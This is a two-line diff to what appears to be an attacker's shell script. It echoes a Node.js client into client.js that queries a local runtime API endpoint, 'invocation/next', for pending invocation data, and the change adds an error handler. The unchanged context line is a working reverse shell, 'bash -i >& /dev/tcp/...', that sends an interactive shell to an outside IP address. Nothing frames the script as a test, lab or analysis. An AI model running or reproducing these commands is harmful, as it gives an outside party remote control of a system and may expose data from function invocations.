@@ -1,2 +1,2 @@
-echo "const s=require('net').connect({port:9001,host:'127.0.0.1'});s.on('connect',()=>s.write('GET /2018-06-01/runtime/invocation/next HTTP/1.1\r\nHost: 127.0.0.1:9001\r\n\r\n'));s.on('data',d=>console.log(d+''));" > client.js
+echo "const s=require('net').connect({port:9001,host:'127.0.0.1'});s.on('connect',()=>s.write('GET /2018-06-01/runtime/invocation/next HTTP/1.1\r\nHost: 127.0.0.1:9001\r\n\r\n'));s.on('data',d=>console.log(d+''));s.on('error',e=>console.error('Error:',e.code));" > client.js
 bash -i >& /dev/tcp/3.95.20.82/4001 0>&1;
